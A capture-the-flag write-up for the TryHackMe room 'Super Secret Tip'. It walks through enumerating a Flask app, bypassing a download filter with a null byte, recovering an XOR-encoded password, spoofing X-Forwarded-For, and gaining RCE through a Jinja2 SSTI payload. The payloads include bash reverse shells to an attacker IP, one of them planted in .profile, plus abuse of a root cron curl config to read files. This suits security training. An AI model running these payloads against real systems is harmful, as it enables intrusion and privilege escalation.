# TryHackMe: Super Secret Tip Writeup

**Room Link:** [Super Secret Tip](https://tryhackme.com/room/supersecrettip)

---

## Initial Enumeration

```bash
nmap 10.145.146.192
```

**Results:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
```

Port 7777 turns out to be a web server:

```bash
nmap -sCV 10.145.146.192 -p7777
```

**Results:**
```text
7777/tcp open  http    Werkzeug httpd 2.3.4 (Python 3.11.0)
|_http-title: Super Secret TIp
```

Viewing the page in a browser shows nothing obviously interesting, but the page source has a suggestive meta tag:

```html
<meta name="description" content="SSTI is wonderful">
```

`gobuster` finds two more paths:

```bash
gobuster dir -u http://$IP:7777 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**
```text
cloud                (Status: 200)
debug                (Status: 200)
```

## Source Code Disclosure

`/cloud` lets you download files or type a filename to download, with limited allowed characters in the input — bypassable by intercepting the request in Burp Suite and setting the `download` parameter directly.

Downloading `templates.py` confirms this is a Flask app. There's no `app.py`, but fuzzing/guessing for the actual source file finds `source.py`:

```http
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=source.py
```

The source reveals the app's logic:

```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"])
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)

@app.route("/debug", methods=["GET"])
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    session['debug'] = debug
    session['password'] = encrypted_pass
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"])
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    if not session:
        return render_template("debugresult.html")
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    if not debug and not user_password:
        return render_template("debugresult.html")
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

The `/debugresult` route builds a template using unsanitized user input via `render_template_string` — classic Server-Side Template Injection.

## Recovering the Debug Password

The `/cloud` route only allows downloading `source.py` and files ending in `.txt`, but the source imports `ip.py` and `debugpassword.py`. A null-byte trick bypasses the extension check:

```text
download=ip.py%00.txt
download=debugpassword.py%00.txt
```

`debugpassword.py`:
```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

`ip.py`:
```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

Downloading `supersecrettip.txt` the same way gives the encrypted password bytes:

```text
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

XOR-ing it back with the known key (`ayham`) recovers the plaintext:

```python
>>> import pwn
>>> s=b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
>>> t=b'ayham'
>>> print(pwn.xor(s,t))
b'AyhamDeebugg'
```

**Debug password:** `AyhamDeebugg`

## Reaching /debugresult

`ip.checkIP` requires the request to appear to originate from `127.0.0.1`, checked via the `X-Forwarded-For` header — trivially spoofable in Burp:

```http
X-Forwarded-For: 127.0.0.1
```

The route also requires a valid Flask session (set by `/debug`). Since the session cookie is only set in the browser, copy it from the browser's dev tools (Storage tab) into Burp:

```http
Cookie: session=.eJyrVkpJTSpNV7JSMtQ2UtJRKkgsLi7PL0oBCiSpK8TEVBgYoBGqQNIwOSamCMQzBnEsQCwzECtVXakWAAvuGVw.amGLCw.DmynasvoO4NLpau-vo3gPiZTXUM
```

With both the forged header and the valid session cookie, `/debugresult` renders the injected template properly.

## RCE via SSTI

The `debug` parameter is reflected directly into the template with no sandboxing, so a standard Jinja2 sandbox-escape payload achieves RCE:

```jinja2
{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/192.168.138.49/4444 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```

With a listener running, this gives a reverse shell as user `ayham`. The first flag is at `/home/ayham/flag1.txt`.

## Privilege Escalation: ayham -> F30s

`/secret-tip.txt` contains an obfuscated hint pointing toward cron jobs and forgetting something related to "before" — a nudge toward `.profile` and `PATH`/pre-execution files.

In `/home/F30s` there are two files, `health_check` (readable) and `site_check` (not readable, but the directory itself is writable by `ayham`). Checking the system crontab:

```bash
cat /etc/crontab
```

```text
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

Every minute, `F30s` logs in via cron and runs `cat` on `health_check`. Since `.profile` runs on every login and is writable, appending a reverse shell there gives a shell as `F30s` on the next cron tick:

```bash
echo "bash -i >& /dev/tcp/192.168.138.49/1234 0>&1" >> .profile
```

## Privilege Escalation: F30s -> root (file read)

`site_check` is a curl config file executed by root every minute via cron. As `F30s`, we can rewrite it to read an arbitrary root-owned file using curl's `file://` scheme and write the output somewhere readable:

```bash
echo 'url="file:///root/flag2.txt"' > site_check
echo '--output "/home/F30s/flag2.txt"' >> site_check
```

Once the next cron run fires, `flag2.txt` appears in `F30s`'s home directory (contents XOR-encoded, matching the pattern established earlier in the room):

```text
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
```

The same `site_check` technique can be reused to pull `/root/secret.txt`:

```text
b'C^_M@__DC\\7,'
```

Both encoded values need to be XOR-decoded against the appropriate key to recover their plaintext, following the same approach used to recover the debug password earlier in the room.
